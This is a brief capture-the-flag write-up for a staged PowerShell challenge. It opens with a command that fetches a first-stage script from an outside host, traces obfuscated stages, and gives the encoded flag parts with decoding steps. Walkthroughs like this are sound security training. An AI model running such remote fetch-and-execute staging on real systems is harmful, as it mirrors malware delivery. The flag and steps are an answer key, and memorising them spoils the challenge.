start by fetching `irm biglizardlover.com/gecko` in a powershell terminal (curl will not work) using [`make-stage1.ps1`](make-stage1.ps1)

follow the lead up to 12 (!!!) stages

some are particularly interesting:

  - stage3 contains 
	  - the next stage [make-stage4-2.ps1](make-stage4-1.ps1)
	  - an interesting scheduled task description that reads `flagvalue = objecttest + consumerfashion + uniquerebel`
	  - and the variable `${COns`UMeRf`A`S`HIOn}` [make-stage4-2.ps1](make-stage4-2.ps1)
  - stage7 contains the variable `$objectTest` 
  - stage12 contains the variable `$UniqueRebel`

the scheduled task descrpition tells us 
```powershell
$objecttest = Wm14aFozczNOak0wTWpZNVlXVmhPRGs9
$consumerfashion = WXpBME16UmtOVGt3TWpnPQ==
$uniquerebel = TWpVeU9UWXlORGN3ZlE9PQ==
```

the 3 variables all seem to be valid base64 encoded , let's throw them in [Cyberchef](https://cyberchef.formality.de/#recipe=Fork('%5C%5Cn','',false)From_Base64('A-Za-z0-9-_',true,false)From_Base64('A-Za-z0-9-_',true,false)&input=V20xNGFGb3pjek5PYWswd1RXcFpOVmxYVm1oUFJHcwpXWHBCTUUxNlVtdE9WR3QzVFdwblBRPT0KVFdwVmVVOVVXWGxPUkdOM1psRTlQUT09), they are actually double base64 encoded and will eventually yield the flag